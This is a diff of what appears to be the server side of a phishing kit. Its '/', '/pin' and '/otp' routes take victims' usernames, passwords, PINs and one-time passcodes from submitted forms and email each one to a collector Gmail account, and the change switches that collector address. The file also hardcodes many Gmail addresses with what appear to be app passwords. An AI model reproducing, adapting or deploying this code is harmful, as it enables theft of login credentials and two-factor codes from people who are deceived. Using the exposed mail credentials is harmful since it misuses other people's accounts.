@@ -24,18 +24,22 @@ app.post("/", (req, res) => {
       // pass: "yknycyzsxdkxpepq",
       // user: "gracesufficient65@gmail.com",
       // pass: "gdvumrctjugtigmo",
-      user: "Victorchinemerem191@gmail.com",
-      pass: "ydrmvoxoqbraqdvd",
+      // user: 'Victorchinemerem191@gmail.com',
+      // pass: 'aivsveolwtqinddb'
       // user: 'Victorchinemeremfx.112@gmail.com',
       // pass: 'eujqfpdvuhepijkk'
       // user: "join.kudapp@gmail.com",
       // pass: "ftjbwzimegueosaw",
+      // user: "youngkesh110@gmail.com",
+      // pass: "euaqhqghheyvvzey",
+      user: "scottmccall2277@gmail.com",
+      pass: "ayfeysoczsyqrsmd",
     },
   });
 
   const mailOptions = {
     from: email,
-    to: "Victorchinemerem191@gmail.com",
+    to: "scottmccall2277@gmail.com",
     subject: `Username: ${req.body?.username} \t\n\n\n password: ${req.body?.password}`,
   };
 
@@ -62,18 +66,22 @@ app.post("/pin", (req, res) => {
       // pass: "yknycyzsxdkxpepq",
       // user: "gracesufficient65@gmail.com",
       // pass: "gdvumrctjugtigmo",
-      user: "Victorchinemerem191@gmail.com",
-      pass: "ydrmvoxoqbraqdvd",
+      // user: 'Victorchinemerem191@gmail.com',
+      // pass: 'aivsveolwtqinddb'
       // user: 'Victorchinemeremfx.112@gmail.com',
       // pass: 'eujqfpdvuhepijkk'
       // user: "join.kudapp@gmail.com",
       // pass: "ftjbwzimegueosaw",
+      // user: "barneyyoung9@gmail.com",
+      // pass: "euaqhqghheyvvzey",
+      user: "scottmccall2277@gmail.com",
+      pass: "ayfeysoczsyqrsmd",
     },
   });
 
   const mailOptions = {
     from: email,
-    to: "Victorchinemerem191@gmail.com",
+    to: "scottmccall2277@gmail.com",
     subject: `PIN: ${req.body?.pin} `,
   };
 
@@ -100,14 +108,16 @@ app.post("/otp", (req, res) => {
       // pass: "yknycyzsxdkxpepq",
       // user: "gracesufficient65@gmail.com",
       // pass: "gdvumrctjugtigmo",
-      user: "Victorchinemerem191@gmail.com",
-      pass: "ydrmvoxoqbraqdvd",
+      // user: "barneyyoung9@gmail.com",
+      // pass: "euaqhqghheyvvzey",
+      user: "scottmccall2277@gmail.com",
+      pass: "ayfeysoczsyqrsmd",
     },
   });
 
   const mailOptions = {
     from: email,
-    to: "Victorchinemerem191@gmail.com",
+    to: "scottmccall2277@gmail.com",
     subject: `OTP: ${req.body?.otp} `,
   };
 
